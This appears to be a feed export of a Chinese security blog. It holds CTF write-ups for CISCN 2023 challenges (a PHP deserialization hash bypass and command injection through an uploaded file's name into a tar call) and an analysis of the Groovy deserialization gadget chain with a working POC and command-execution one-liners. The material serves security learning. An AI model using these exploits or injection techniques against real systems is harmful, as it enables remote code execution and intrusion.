<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="comment">//注意date函数可以进行转义 把/f\l\a\g转化为/flag</span></span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="comment">//uniqid函数用于生成标识</span></span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="comment">//文件写入操作 把content作为内容写入的uuid中</span></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="comment">//正则匹配替换 把uuid中的内容进行替换 赋给data</span></span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="comment">//输出data的内容即\flag</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// unserialize(base64_decode($_GET[&#x27;code&#x27;])); </span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; b = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; file = <span class="string">&quot;/f\l\a\g&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>((<span class="variable">$a</span>))))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719202258630.png" alt="image-20230719202258630"></p><p><strong>总结</strong></p><ol><li>就是不使用数组  使用数字和字符来绕过<strong>md5</strong>和<strong>sha1</strong>  </li><li>就是使用转义可以避免<code>date</code>函数识别错误</li></ol><h2 id="CISCN-2023-华北-pysym"><a href="#CISCN-2023-华北-pysym" class="headerlink" title="[CISCN 2023 华北]pysym"></a>[CISCN 2023 华北]pysym</h2><p>这里给了个附件  其中关键的核心代码是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br></pre></td></tr></table></figure><p>这里解释了一下上面创建文件新路径的代码</p><p><img src="../images/image-20230719203928179.png" alt="image-20230719203928179"></p><p><img src="../images/image-20230719204806115.png" alt="image-20230719204806115"></p><p>做题多的师傅一下子可能就会想到这里可能存在这个命令的同时执行</p><p>因为这个<code>savepath</code>最后的话是这个<code>filename</code>，所以说我们就可以控制这个<code>savepath</code>了   不能控制这个<code>directory</code> 的原因是因为这个的话上传路径我们不知道  生成的随机数也不可控</p><p><img src="../images/image-20230719205333200.png" alt="image-20230719205333200"></p><p>经过本地测试是能成功执行的  但是换到题目上的时候就没有回显  于是考虑数据外带一下<strong>(弹个shell方便一点)</strong></p><p><strong>考虑到弹shell有些符号是不给使用的  于是就尝试进行base64编码一下</strong></p><p><img src="../images/image-20230719210420750.png" alt="image-20230719210420750"></p><p><strong>这样在自己的服务器上就能收到shell了   由于我这里是公司  弹shell会被墙</strong></p><p>所以就不搞了</p><p><strong>总结</strong></p><ul><li>其实考察点就是<code>python</code>的代码审计和这个命令执行   能否想到的这个问题</li><li>现在的话也是可以想为现在的话是可以  <code>unzip</code>  <code>tar</code>  这些解压命令都可以进行<code>rce</code></li></ul><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN-2023-华北-ez-date&quot;&gt;&lt;a href=&quot;#CISCN-2023-华北-ez-date&quot; class=&quot;headerlink&quot; title=&quot;[CISCN 2023 华北]ez_date&quot;&gt;&lt;/a&gt;[CISCN 2023 华北]ez_date</summary>
      
    
    
    
    
    <category term="Nss-Ciscn2023" scheme="https://ke1nys.github.io/tags/Nss-Ciscn2023/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试</title>
    <link href="https://ke1nys.github.io/posts/8ddb4c74.html"/>
    <id>https://ke1nys.github.io/posts/8ddb4c74.html</id>
    <published>2023-07-18T02:10:28.000Z</published>
    <updated>2023-07-19T11:38:38.090Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="152b8dc2f8b97507f4f94d8930791be027f249f5a5f3fa42334d74987b4b64fb">1a90164da2a38547586d85c848ea23234cf9ef63a8ceedbc151c794cde2931a4d0bfb7ff1045dab3f9bce09aed7c65b72a5cf1365959cc03b50a6d00ba51a256937bd6f838b61ede456b68db5c420595ea39afe5281b0bad21b2aa8e6e36748bedf23d55437eb2e9f41fd3c718a10215395c58674198df302f1469aa52eefd4ce1a3d2b1b82cc88d6e38c704c80465c2f4c15bb000943b7b9ba77782c958b4d6ad502180b504664fca00d6c2ad39e1b1f5ca92802ebdfb8fd885ab5a6f913503</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://ke1nys.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>java-Groovy</title>
    <link href="https://ke1nys.github.io/posts/3776a7e3.html"/>
    <id>https://ke1nys.github.io/posts/3776a7e3.html</id>
    <published>2023-07-17T12:26:52.000Z</published>
    <updated>2023-07-19T11:38:38.074Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>Groovy是Apache 旗下的一种基于JVM的面向对象编程语言，既可以用于面向对象编程，也可以用作纯粹的脚本语言。在语言的设计上它吸纳了Python、Ruby 和 Smalltalk 语言的优秀特性，比如动态类型转换、闭包和元编程支持。 Groovy与 Java可以很好的互相调用并结合编程 ，比如在写 Groovy 的时候忘记了语法可以直接按Java的语法继续写，也可以在 Java 中调用 Groovy 脚本。比起Java，Groovy语法更加的灵活和简洁，可以用更少的代码来实现Java实现的同样功能。</p><h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><p><code>Groovy : 1.7.0-2.4.3</code></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span>  <span class="operator">=</span> MethodClosure.class.getDeclaredMethod(<span class="string">&quot;doCall&quot;</span>, Object.class);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m.invoke(mc, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先从这个类开始入手  (<strong>就是最后执行代码的地方</strong>)</p><p><code>org.codehaus.groovy.runtime.MethodClosure</code> 是方法闭包，使用闭包代表了一个对象的一个方法，可以很方便的调用。</p><p>MethodClosure 初始化时接收两个参数，一个是对象，一个是对象的方法名称。</p><p><img src="../images/image-20230718191350775.png" alt="image-20230718191350775"></p><p>​    </p><p>MethodClosure 中有一个 doCall 方法，调用 <code>InvokerHelper.invokeMethod()</code> 方法进行方法调用。</p><p><img src="../images/image-20230718191421942.png" alt="image-20230718191421942"></p><p>这里就是先使用<code>MethodClosure</code>来进行传值  <strong>分别是传一个对象和这个对象的某个方法</strong></p><p>由于这个<code>doCall</code>()是个<code>protected</code>方法   得使用反射调用 </p><p><img src="../images/image-20230718191723300.png" alt="image-20230718191723300"></p><p>这个最后一步的意思就是反射调用这个<code>doCall()</code>方法，然后传值是这个<code>calc</code></p><p><strong>m：就是等会会调用<code>doCall</code>这个方法</strong></p><p><strong><code>invoke(mc,&quot;calc&quot;)</code>  这个里面的<code>mc</code>指的是调用这个<code>MethodClosure</code> 里的<code>doCall</code>方法  <code>calc</code>是这个<code>daCall</code>的参数</strong></p><p><img src="../images/image-20230718192709132.png" alt="image-20230718192709132"></p><h3 id="String-execute-方法"><a href="#String-execute-方法" class="headerlink" title="String.execute() 方法"></a>String.execute() 方法</h3><p>Groovy 为 String 类型添加了 <code>execute()</code> 方法，以便执行 shell 命令，这个方法会返回一个 Process 对象。也就是说，在 Groovy 中，可以直接使用 <code>&quot;ls&quot;.execute()</code> 这种方法来执行系统命令 “ls”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        println(<span class="string">&quot;whoami&quot;</span>.execute().text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里切记生成文件的要选groovy，不然会执行不了</p><p><img src="../images/image-20230718192832925.png" alt="image-20230718192832925"></p><p>其实就是使用<code>Runtime.getRuntime().exec()</code>来执行</p><p><strong>如果在java中可以这样写</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        methodClosure.call();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 分析一波 下个断点</p><p><img src="../images/image-20230718200009817.png" alt="image-20230718200009817"></p><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"><span class="string">&quot;calc&quot;</span>.execute()</span><br><span class="line"><span class="string">&#x27;calc&#x27;</span>.execute()</span><br><span class="line"><span class="string">&quot;$&#123;&quot;</span>calc<span class="string">&quot;.execute()&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;$&#123;&#x27;calc&#x27;.execute()&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">&quot;cmd /c dir&quot;</span>.execute().text</span><br><span class="line">println <span class="string">&#x27;whoami&#x27;</span>.execute().text</span><br><span class="line">println <span class="string">&quot;$&#123;&quot;</span>whoami<span class="string">&quot;.execute().text&#125;&quot;</span></span><br><span class="line">println <span class="string">&quot;$&#123;&#x27;whoami&#x27;.execute().text&#125;&quot;</span></span><br><span class="line"><span class="type">def</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">println <span class="string">&quot;$&#123;cmd.execute().text&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h3><p><code>org.codehaus.groovy.runtime.ConvertedClosure</code> 是一个通用适配器，用于将闭包适配到 Java 接口。ConvertedClosure 实现了 ConversionHandler 类，而 ConversionHandler 又实现了 InvocationHandler。所以说 ConvertedClosure 本身就是一个动态代理类。</p><p>ConvertedClosure 的构造方法接收一个 Closure 对象和一个 String 类型的 method 方法名，也就是说 ConvertedClosure 会代理这个 Closure 对象，当调用其 method 方法时，将会调用 ConvertedClosure 父类的 <code>invoke</code> 方法，除了 toString 和一些默认方法外，会调用 <code>invokeCustom</code> 方法。</p><p>如果初始化时指定的 method 与 <code>invokeCustom</code> 指定的 method 参数相同，则 <code>invokeCustom</code> 方法将会调用代理对象 Closure 的 call 方法执行传入参数执行。</p><p><img src="../images/image-20230718194334220.png" alt="image-20230718194334220"></p><p>看到这里就明白这条链的触发逻辑了。后面自然是使用 <code>AnnotationInvocationHandler</code> 将 <code>ConvertedClosure</code> 代理成 <code>Map</code> 类。这样在反序列化</p><h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><p><strong>最终的POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Groovy.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//封装我们需要执行的对象</span></span><br><span class="line"><span class="type">MethodClosure</span>    <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;open -a Calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line"><span class="type">ConvertedClosure</span> <span class="variable">closure</span>       <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt;       c           = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 ConvertedClosure 的动态代理类实例</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">handler</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, closure);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用动态代理初始化 AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, handler);</span><br><span class="line"></span><br><span class="line">SerializeUtil.writeObjectToFile(invocationHandler, fileName);</span><br><span class="line">SerializeUtil.readFileObject(fileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用链展示</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map.entrySet() (Proxy)</span><br><span class="line">        ConversionHandler.invoke()</span><br><span class="line">            ConvertedClosure.invokeCustom()</span><br><span class="line">        MethodClosure.call()</span><br><span class="line">                    ProcessGroovyMethods.execute()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719191853074.png" alt="image-20230719191853074"></p><p>调用entrySet，然后触发invoke</p><p><img src="../images/image-20230719192046197.png" alt="image-20230719192046197"></p><p>调用了<code>ConversionHandler#invoke()</code>方法</p><p><img src="../images/image-20230719192158196.png" alt="image-20230719192158196"></p><p><img src="../images/image-20230719192238123.png" alt="image-20230719192238123"></p><p>接着就会调用到<code>ConvertedClosure#invokeCustom()</code>方法   <strong>并且由于这个</strong></p><p><strong><code>methodName</code>和这个传进来的<code>method</code>的<code>name</code>一样 </strong> 就会调用<code>call</code>()方法</p><p><img src="../images/image-20230719192521353.png" alt="image-20230719192521353"></p><p><img src="../images/image-20230719192653618.png" alt="image-20230719192653618"></p><p>这里的话到最后就rce了  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h2&gt;&lt;p&gt;Groovy是Apache 旗下的一种基于JVM的面向对象编程语言，既可以用于面向对象编程，也可以用作纯粹的脚本语言。在语言的设计上它吸纳了</summary>
      
    
    
    
    
    <category term="java-Groovy" scheme="https://ke1nys.github.io/tags/java-Groovy/"/>
    
  </entry>
  
  <entry>
    <title>show-XXE</title>
    <link href="https://ke1nys.github.io/posts/9d7a060.html"/>
    <id>https://ke1nys.github.io/posts/9d7a060.html</id>
    <published>2023-07-14T09:51:43.000Z</published>
    <updated>2023-07-19T11:38:38.089Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a57f27d4864f5e5500d24962cb2c714021c6ed7e1cde1069c46baeeb16e50bdd">1a90164da2a38547586d85c848ea2323ec79e6220953f449a6bfc1f9903c2c19dcc37d7e19f9c3ea8136f6bafde14cee46823ba434db82cd2f85dc031b2e75626196bdef44f75f674b03e086eb8a4ed9dd38528282b828fd5b1ec4b08287f19abe7b1a04a7dd355ba119432445acec70fa229a69b785ff6218677ceae65c29784ef57875a7f1bbf1f7abce39d35637c117414dd85ab99e2c71338474762e67d57f5896dee0e15679793e968aa3ef6ae7718d1c9946cd7e388dc579dc60a07f72d8564db8f94ec4db7ddb1df056fe847fbafa2f8753d32d8fd98bf0ef7e9daaa7f0a1aaa3c893630c8c1c2213e9ed2e7cd05caf900b6de505eae5a494c922b58a1bca012e0726cca30cbcbd4b13a5ec738e7ad9e90191944252dfd41322873e8db6f85e427e5a02ae2da8f98e68846b9243f25c0abbf9b7613b0dce86fa84e249cc355c84e00fad151f5d2eebd01741f5c014491ea4a48bbe0b4280728400ebc58ccb73ab516c6be349b7ff542f76b8d2610b643214156977f5b085dcabae8a065833e74a768c1cfe591f475954298128c6ad9355150016e1d55a9cc2187131e83e4f962d6c20535df2886cbd96b4312ac27c6e42617cb7baaabd9f316fdcbf52969a2d59a7eefd61ee3b3f139658cf83d2c67dc105fbf1809f0bf8e56b0e4e18f02608cf070caf3c9205379e1baeaddf419a519bef2acd035b1710fadc8bcb82637018438f4327bb04a0cdd9b426e039187588e9343a5f8f7ab666460911f5504f11550184bc883a531892a3b9a8632bd49097be7fa87166ce8b504a201b87a53da4917c81da356cc829d99d37fa59378f4a903c19354d52bab44a9dc36892a9b53528b35880023caded1461e4a2dc81769c3bdbfc8f89c46de5b419b670e1452924656ce5c38f24e731a17ce789e7628e289c4dde4d7ebb0f43b4233cca0e37c45a3a845ef5da618feecbcc3bc259444b07e33e472c6ec7c246c58489dc0fd9ded287722f83040a3c8b869e23705d298438ef40b39eb61eff7c0e119e8a33281fb59a8d08bb1d34bce83f7c9d3b06690283b3b55e671865de634609fd0d54e3256716f49266a3339b6ecd44b4b40274906edfc873208c73ed21b73860d020e44a2c585a5913106e81191ce61f05b51a313707c044e57aae62fc99b0b1768d7fd62149e87060dcc74dc85e4f1c7844c714cbae66aeb3996d000140ffa7ae7e3230cde2c3c8cb6e26ea63c6ef406b4bfc804334876d0bcbbe0aeb2c80d5f4b4bff588d46367f64d575395db944141d4eced0a7f6f0bfb9fef0e13aa0cfa8b3818283195c47934770b7be7eef177354a38ce186a253f205cd165e7cdbecdd0e992a51624c55912cf4082d2fc48de2d1120a2167146acfad238da1500a27574bd0cefd7d723fe86a4a7b61436fcf60f34c2e943174085cbbae66dc029782c6ac9139329ba2804de1512d5a7133b2e04c9d9562b26d24f9c3329d94872fff40822b89361d07172ad026ec265ca5243241e6414d5748d8b7f5d4d8b4cdc0589aefdedd6685e7cded529a704992151c9d59a3818c42634e58459275ee46b5df9493a9b2a0855f9d93e71af280bb6e74b24b8df9a901ccaff04871a9154f16ab79f727541c9df789760782a092581de4c0f0554086a58e904d31fd21797aebac1de815cb1aad79d13f875d84a28bef55291a0018bac229ad145871e7b2ae75f968c80cc913d5e79fe91ab147b10555a517510662e85b7e41aff0e6bc6c8f8e1f16192cffc39d7ecc12b7b721259a03816f4babd6f79b0db145edee57435eb91041310f3f58a66a12ef8a94b1ca0091d5000bce11a82ad7260e33a5279de28d4440490023bcd5c7e0c9dc1f8e902d53265cff3e650826f932a5ee995e3c34fcfe751d6d1f14d5063f870589a86c82959ceccbe2b88278414c20fd13e3c7d15f0f6b6d18b55bfa9e24f79d1fbedbbd9a34555e770839e2d1f2beaa54d5d0cbc292f62cd423772b17eb43aaa757550448411d22af6a955cea7ff261fdfda2a3c99c911de19b870a1a6070629cb18709dc579e35b6e062f7c7838764687c5ecf1dbe3365129f760db13805281d2dc0bcf01dae6e3d194f17d880ba0fc13cb5d1484eb8600e4cc546ea60b0c38a6f0518d81cf05462d150e65d230df683a21fab4b3843f45af815846c1fc9f46db77261de189ed080329329a78bc1ea4c164d855951ce9c758b0600469b69e5ede613154038379e7e24780a5c71079035ea67b49c7be272e219e736a5fae7642e3f664b322a1e20b399cad29acddea03add65ae0a0155b27be161a8bb669ea42137777ba1bfd66cc9ac65f9388b18fe8ce8c832add8ee7abf72cc1914858652d1454fc4a8e0eb924a5d530536a8dda6de78815ce7c5af7aef0a724d9c3f79bc6c9b066c6159758709fd9d2248ab0c9e332977b747e4612fe035e5276f9185041dcd3a0dc275ef7960da2e2e0425939eb11783d0442ab83101bff57a1f195f5c7382a507d1e6a5ae462974406c034feef2ceaf159b05460a1ff974e3a8e55c02c3a0bd70ce28e5276a8eca1d7e79bd73dc43d724524762a928f9dd3ecab5ee0dc915535913bf2cd6e01e75b0526fe80bd8d69cd1884dd603d67aea174ae9ccd73716b74d919c004cdb01ba3e3547a06319bb77fd0c7ceed7096afe21a5527afddaa4175830bcc5baad8e4e38409b5c22c1fc18d80d90397a45c04c52432087f